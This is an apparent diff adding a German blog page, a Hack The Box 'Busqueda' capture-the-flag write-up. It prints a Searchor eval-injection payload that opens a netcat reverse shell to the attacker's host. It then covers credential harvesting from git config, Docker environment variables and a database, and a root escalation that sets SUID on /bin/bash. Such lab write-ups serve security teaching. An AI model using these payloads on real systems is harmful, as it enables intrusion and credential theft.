@@ -1,0 +1,581 @@
+<!doctype html>
+<html lang="de" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/particles.css">
+    <link rel="preload"
+      href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"
+      as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <noscript><link rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+    <link rel="apple-touch-icon" sizes="180x180"
+      href="/assets/images/favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32"
+      href="/assets/images/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16"
+      href="/assets/images/favicon/favicon-16x16.png">
+    <link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+  </head>
+
+  <body class="layout--single">
+
+    <nav class="skip-links">
+      <ul>
+        <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary
+            navigation</a></li>
+        <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+        <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+      </ul>
+    </nav>
+
+    <div class="masthead">
+      <div class="masthead__inner-wrap">
+        <div class="masthead__menu">
+          <nav id="site-nav" class="greedy-nav">
+
+            <a class="site-logo" href="/"><img src="/assets/images/avatar.png"
+                alt="Florians Blog"></a>
+
+            <a class="site-title" href="/">
+              Florians Blog
+
+            </a>
+            <ul class="visible-links"><li class="masthead__menu-item">
+                <a href="/about/">Über mich</a>
+              </li></ul>
+
+            <button class="greedy-nav__toggle hidden" type="button">
+              <span class="visually-hidden">Menü ein-/ausschalten</span>
+              <div class="navicon"></div>
+            </button>
+            <ul class="hidden-links hidden"></ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="initial-content">
+      <div id="particles-js"></div>
+
+      <div id="main" role="main">
+
+        <div class="sidebar sticky">
+
+          <div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+            <div class="author__content">
+              <h3 class="author__name p-name" itemprop="name">
+                <a class="u-url" rel="me" href="http://localhost:4000/"
+                  itemprop="url">Florian aka B4M4B0Y</a>
+              </h3>
+
+              <div class="author__bio p-note" itemprop="description">
+                <p>Informatik Bachelor mit Leidenschaft für <strong>Cyber
+                    Security</strong>.</p>
+
+              </div>
+
+            </div>
+
+            <div class="author__urls-wrapper">
+              <button class="btn btn--inverse">Folgen</button>
+              <ul class="author__urls social-icons">
+
+                <li itemprop="homeLocation" itemscope
+                  itemtype="https://schema.org/Place">
+                  <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i>
+                  <span itemprop="name" class="p-locality">Bayern</span>
+                </li>
+
+              </ul>
+            </div>
+          </div>
+
+        </div>
+
+        <article class="page h-entry" itemscope
+          itemtype="https://schema.org/CreativeWork">
+          <meta itemprop="headline" content="Hack The Box Busqueda Writeup">
+          <meta itemprop="description"
+            content="Writeup zur Busqueda Maschine von Hack The Box">
+          <meta itemprop="datePublished" content="2023-08-12T00:00:00+02:00">
+
+          <div class="page__inner-wrap">
+
+            <header>
+
+              <p class="page__meta">
+
+                <span class="page__meta-date">
+                  <i class="far fa-calendar-alt" aria-hidden="true"></i>
+
+                  <time datetime="2023-08-12T00:00:00+02:00">12 August, 2023</time>
+                </span>
+
+                <span class="page__meta-sep"></span>
+
+                <span class="page__meta-readtime">
+                  <i class="far fa-clock" aria-hidden="true"></i>
+
+                  5 Minuten zum Lesen
+
+                </span>
+
+              </p>
+
+            </header>
+
+            <section class="page__content e-content" itemprop="text">
+
+              <h1 id="writeup-zur-busqueda-maschine-von-hack-the-box">Writeup
+                zur Busqueda Maschine von Hack The Box</h1>
+
+              <h2 id="schwierigkeit---easy">Schwierigkeit - Easy</h2>
+
+              <h2 id="nmap-scan">Nmap scan</h2>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>Nmap scan report for 10.129.199.156
+Host is up (0.023s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://searcher.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+              <p>Wir fügen searcher.htb zu unserer /etc/hosts Datei mit der
+                zugehörigen IP-Adresse (10.129.199.156) hinzu.</p>
+
+              <h2 id="weboberfläche">Weboberfläche</h2>
+
+              <p>Die Suche nach Subdomains mit ffuf war ohne Erfolg, also sehen
+                wir uns die Weboberfläche genauer an.</p>
+
+              <p><img src="/assets/writeups/busqueda/webapp.png"
+                  alt="Weboberfläche" /></p>
+
+              <p>Es handelt sich um eine Art Suchmaschine, bei der wir nach
+                Begriffen suchen können. Weiter unten sehen wir, dass die
+                Weboberfläche mit Flask und Searchor 2.4.0 erstellt wurde.</p>
+
+              <h3 id="rce">RCE</h3>
+              <p><br />
+                Googlen wir nach “Searchor 2.4.0 exploit”, so werden wir schnell
+                fündig.</p>
+
+              <p><img src="/assets/writeups/busqueda/rce.png" alt="RCE" /></p>
+
+              <p>Hier noch ein Screenshot zur Ausführung des Exploits mit dem
+                daugehörigen Github Repository und der eval-Funktion in Python,
+                welche bei dieser Version von Searchor Remote-Code-Execution
+                (RCE) ermöglicht.</p>
+
+              <h3 id="reverse-shell">Reverse Shell</h3>
+              <p><br />
+                Mit folgendem Payload können wir eine Reverse Shell als Benutzer
+                “svc” zu unserer Maschine starten:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>engine=Accuweather&amp;query=test')+and+__import__('os').system('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2&gt;%261|nc+10.10.14.249+4321+&gt;/tmp/f')%23
+</code></pre></div></div>
+
+              <p>Alternativ könnten wir auch eine Reverse Shell mit Netcat
+                starten, da die Maschine auch Netcat enthält. Nur der Reverse
+                Shell Payload könnte dabei so aussehen:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.249 4321 &gt;/tmp/f
+</code></pre></div></div>
+
+              <p>Durchstöbern wir die Konfiguration des Webservers
+                (sites-available/000-default.conf von Apache) etwas, stellen wir
+                folgendes fest:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>ServerName gitea.searcher.htb
+</code></pre></div></div>
+
+              <p>Obwohl wir nach Subdomains gefuzzt haben, wurde uns diese nicht
+                angezeigt.
+                <br />
+                Auch finden wir im Wurzelverzeichnis der Webanwendung noch
+                interessante Dateien:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>svc@busqueda:/var/www/app/.git$ cat config
+cat config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+svc@busqueda:/var/www/app/.git$
+</code></pre></div></div>
+
+              <p>Interessanterweise können wir uns nun über ssh mit dem Benutzer
+                “svc” und dem Passwort von “cody” anmelden.
+                Auch können wir uns mit “cody” und seinem Passwort auf der gitea
+                Subdomain anmelden und dort den Quellcode der Flask Webanwendung
+                sehen.</p>
+
+              <h3 id="benutzer-root-übernehmen">Benutzer root übernehmen</h3>
+              <p><br />
+                Um der Root Benutzer zu werden führen wir zunächst “sudo -l”
+                aus, da wir das Passwort von “svc” bereits wissen.</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+</code></pre></div></div>
+
+              <p>Wir können ein Python Skript als root Benutzer ausführen und
+                dabei beliebige Parameter hinten anhängen.<br />
+                Schauen wir uns die Berechtigungen des Skriptes an, stellen wir
+                fest, wir können es lediglich ausführen und nicht
+                lesen/schreiben.</p>
+
+              <p>Führen wir das Skript einmal mit einem test Parameter aus, um
+                zu sehen wie es reagiert:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>-bash-5.1$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py test
+Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+</code></pre></div></div>
+
+              <p>Der Parameter docker-ps scheint als erste Anlaufstelle am
+                sinnvollsten zu sein.
+                Wir erhalten bei der Ausführung des Skriptes mit dem docker-ps
+                Parameter folgende Ausgabe:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up 9 hours   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up 9 hours   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+</code></pre></div></div>
+
+              <p>Es existieren zwei Docker Container (gitea und mysql_db)</p>
+
+              <p><a
+                  href="https://docs.docker.com/engine/reference/commandline/inspect/">Docker
+                  inspect Dokumentation</a></p>
+
+              <p>Mit Hilfe dieser Dokumentation können wir die Konfiguration des
+                Docker Containers abfragen und erhalten folgende Ausgabe:
+                Edit: Leider sind die jeweiligen Parameter bei format nicht
+                abgebildet, sie lauten aber hier jeweils <br /> “{{json
+                .Config}}”.</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>-bash-5.1$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='' f84a6b33fb5a
+--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
+
+-bash-5.1$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='' 960873171e2e
+--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
+</code></pre></div></div>
+
+              <p>Wir können folgende Informationen festhalten:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>gitea:jI86kGUuj87guWr3RyF für mysql
+gitea:yuiu1hoiu4i5ho1uh für gitea
+</code></pre></div></div>
+
+              <p>Leider können wir diese Informationen noch nicht gewinnbringend
+                einsetzen.
+                Ein weiterer Docker inspect Befehl lautet wie folgt:
+                Edit: Leider sind die jeweiligen Parameter bei format nicht
+                abgebildet, sie lauten aber hier <br /> “{{range
+                .NetworkSettings.Networks}}{{.IPAddress}}{{end}}”.</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>sudo -u root python3 /opt/scripts/system-checkup.py docker-inspect --format='' f84a6b33fb5a
+</code></pre></div></div>
+
+              <p>Mit Hilfe dieses Befehls erhalten wir die IP-Adresse des Docker
+                Containers. In diesem Fall 172.19.0.3.
+                Nun melden wir uns über mysql an. Dazu verwenden wir den root
+                Benutzer und das root-Passwort für den mysql Account, welches
+                wir bereits herausgefunden haben.</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>-bash-5.1$ mysql -u root -p -h 172.19.0.3
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2577
+Server version: 8.0.31 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt;
+</code></pre></div></div>
+
+              <p>Nun führen wir folgende mysql Statements aus, um Informationen
+                aus der Datenbank zu exfiltrieren:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>show databases;
+use gitea;
+show tables;
+select name,passwd from user;
+</code></pre></div></div>
+
+              <p>Folgende Ausgabe erhalten wir:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>administrator:ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
+cody:b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e
+</code></pre></div></div>
+
+              <p>Nach ein wenig ausprobieren, konnte ich mich mit folgenden
+                Zugangsdaten erneut bei gitea (dieses Mal als administrator)
+                anmelden:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>administrator:yuiu1hoiu4i5ho1uh
+</code></pre></div></div>
+
+              <p>Jetzt können wir uns die Implementierung des Python Skriptes
+                ansehen, welches wir als root Benutzer ausführen können.</p>
+
+              <p><img src="/assets/writeups/busqueda/root.png" alt="root" /></p>
+
+              <p>Wir sehen, dass wir mit dem Parameter “full-checkup” das Skript
+                “full-checkup.sh” ausführen.
+                Das ist soweit auch gut, da dieses Skript sich auch im
+                Verzeichnis /opt/scripts/ befindet und somit gefunden wird.<br />
+                Führen wir allerdings das Python Skript von einem anderen
+                Verzeichnis außer /opt/scripts/ aus, sucht das Python Skript
+                dort zuerst nach der “full-checkup.sh” Datei. Dies können wir
+                natürlich zu unserem Vorteil nutzen und ein Skript
+                “full-checkup.sh” beispielsweise im Home-Verzeichnis vom
+                Benutzer “svc” mit folgendem Inhalt schreiben:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>chmod u+s /bin/bash
+</code></pre></div></div>
+
+              <p>Führen wir nun das Python Skript aus unserem Home-Verzeichnis
+                aus, in der sich die Datei “full-checkup.sh” von uns befindet
+                aus, erhalten wir folgendes Ergebnis:</p>
+
+              <div class="language-plaintext highlighter-rouge"><div
+                  class="highlight"><pre class="highlight"><code>-bash-5.1$ sudo -u root python3 /opt/scripts/system-checkup.py full-checkup full-checkup.sh
+Something went wrong
+-bash-5.1$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
+-bash-5.1$ bash -p
+bash-5.1# id
+uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root),1000(svc)
+bash-5.1# whoami
+root
+bash-5.1#
+</code></pre></div></div>
+
+              <p>Wie wir sehen können haben wir erfolgreich das SUID-Bit bei
+                /bin/bash gesetzt und konnten einfach mit bash -p zu einer
+                Root-shell wechseln.</p>
+
+            </section>
+
+            <footer class="page__meta">
+
+              <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt"
+                    aria-hidden="true"></i> Aktualisiert:</strong> <time
+                  class="dt-published" datetime="2023-08-12T00:00:00+02:00">12
+                  August, 2023</time></p>
+
+            </footer>
+
+            <section class="page__share">
+
+              <h4 class="page__share-title">Teilen auf</h4>
+
+              <a
+                href="https://twitter.com/intent/tweet?text=Hack+The+Box+Busqueda+Writeup%20http%3A%2F%2Flocalhost%3A4000%2FHack-The-Box-Busqueda-Writeup%2F"
+                class="btn btn--twitter"
+                onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+                title="Teilen auf Twitter"><i class="fab fa-fw fa-twitter"
+                  aria-hidden="true"></i><span> Twitter</span></a>
+
+              <a
+                href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2FHack-The-Box-Busqueda-Writeup%2F"
+                class="btn btn--facebook"
+                onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+                title="Teilen auf Facebook"><i class="fab fa-fw fa-facebook"
+                  aria-hidden="true"></i><span> Facebook</span></a>
+
+              <a
+                href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2FHack-The-Box-Busqueda-Writeup%2F"
+                class="btn btn--linkedin"
+                onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+                title="Teilen auf LinkedIn"><i class="fab fa-fw fa-linkedin"
+                  aria-hidden="true"></i><span> LinkedIn</span></a>
+            </section>
+
+            <nav class="pagination">
+
+              <a href="/Hack-The-Box-Agile-Writeup/" class="pagination--pager"
+                title="Hack The Box Agile Writeup
+">Vorherige</a>
+
+              <a href="#" class="pagination--pager disabled">Nächste</a>
+
+            </nav>
+
+          </div>
+
+        </article>
+
+        <div class="page__related">
+          <h2 class="page__related-title">Ihnen gefällt vielleicht auch</h2>
+          <div class="grid__wrapper">
+
+            <div class="grid__item">
+              <article class="archive__item" itemscope
+                itemtype="https://schema.org/CreativeWork">
+
+                <div class="archive__item-teaser">
+                  <img src="/assets/writeups/agile/teaser.png" alt>
+                </div>
+
+                <h2 class="archive__item-title no_toc" itemprop="headline">
+
+                  <a href="/Hack-The-Box-Agile-Writeup/" rel="permalink">Hack
+                    The Box Agile Writeup
+                  </a>
+
+                </h2>
+
+                <p class="page__meta">
+
+                  <span class="page__meta-date">
+                    <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+
+                    <time datetime="2023-08-06T00:00:00+02:00">6 August, 2023</time>
+                  </span>
+
+                  <span class="page__meta-sep"></span>
+
+                  <span class="page__meta-readtime">
+                    <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+
+                    5 Minuten zum Lesen
+
+                  </span>
+
+                </p>
+
+                <p class="archive__item-excerpt" itemprop="description">Writeup
+                  zur Agile Maschine von Hack The Box
+
+                </p>
+              </article>
+            </div>
+
+            <div class="grid__item">
+              <article class="archive__item" itemscope
+                itemtype="https://schema.org/CreativeWork">
+
+                <div class="archive__item-teaser">
+                  <img src="/assets/writeups/inject/teaser.jpg" alt>
+                </div>
+
+                <h2 class="archive__item-title no_toc" itemprop="headline">
+
+                  <a href="/Hack-The-Box-Inject-Writeup/" rel="permalink">Hack
+                    The Box Inject Writeup
+                  </a>
+
+                </h2>
+
+                <p class="page__meta">
+
+                  <span class="page__meta-date">
+                    <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+
+                    <time datetime="2023-08-02T00:00:00+02:00">2 August, 2023</time>
+                  </span>
+
+                  <span class="page__meta-sep"></span>
+
+                  <span class="page__meta-readtime">
+                    <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+
+                    4 Minuten zum Lesen
+
+                  </span>
+
+                </p>
+
+                <p class="archive__item-excerpt" itemprop="description">Writeup
+                  zur Inject Maschine von Hack The Box
+
+                </p>
+              </article>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <div class="page__footer-follow">
+          <ul class="social-icons">
+
+            <li><strong>Folgen:</strong></li>
+
+          </ul>
+        </div>
+
+        <div class="page__footer-copyright">&copy; 2023 B4M4B0Y. Möglich durch
+          <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a
+            href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/"
+            rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    <script src="/assets/js/main.min.js"></script>
+
+    <script src="/assets/js/particles.min.js"></script>
+    <script src="/assets/js/particles.js"></script>
+
+  </body>
+</html>
